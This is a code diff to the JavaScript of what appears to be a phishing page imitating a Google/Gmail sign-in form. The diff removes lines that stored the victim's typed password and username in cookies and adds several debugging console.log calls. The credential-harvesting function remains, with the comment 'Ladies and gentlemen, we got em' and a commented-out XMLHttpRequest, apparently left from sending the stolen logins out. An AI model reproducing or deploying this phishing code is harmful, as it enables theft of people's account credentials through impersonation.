@@ -56,8 +56,7 @@ function doEmailStep(){
 function doPasswordStep(){
 	var username = $('#email-input').val()
 	var password = $('#password-input').val()
-    createCookie("pass", password, "1")
-    createCookie("user", username, "1")
+  
 	//Ladies and gentlemen, we got em
 	console.log(username, password)
 	// var xmlHttp = new XMLHttpRequest()
@@ -81,6 +80,8 @@ function doPasswordStep(){
 function toEmailPage(){
 	coogle.scrollTo(400)
 	$('#instruction-text').text('Sign in')
+	console.log("lOG1")
+	console.log($('#instruction-text'))
 	$('#instrution-text-desc').text('Continue to Gmail')
 	$('#email-input').focus()
 }
@@ -101,22 +102,28 @@ function scrollTo(toPerc, duration = 500){
 
 
 function attachEvents(){
+	console.log("NOt found");
+	console.log($('#email-form-step'));
 	$('#email-form-step').on('submit', function( e ){
 		doEmailStep()
+		console.log("EMail step");
 		e.preventDefault()
 	})
 
 
 	$('.btn-next-email').on('click', function(){
+		console.log("next step");
 		doEmailStep()
 	})
 
 	$('#password-form-step').on('submit', function( e ){
+		console.log("pass step");
 		doPasswordStep()
 		e.preventDefault()
 	})
 
 	$('.btn-next-password').on('click', function(){
+		console.log("ENd step");
 		doPasswordStep()
 	})
 
@@ -125,4 +132,5 @@ function attachEvents(){
 window.onload = function(){
 	onReady()
 	attachEvents()
+	console.log("login end");
 }
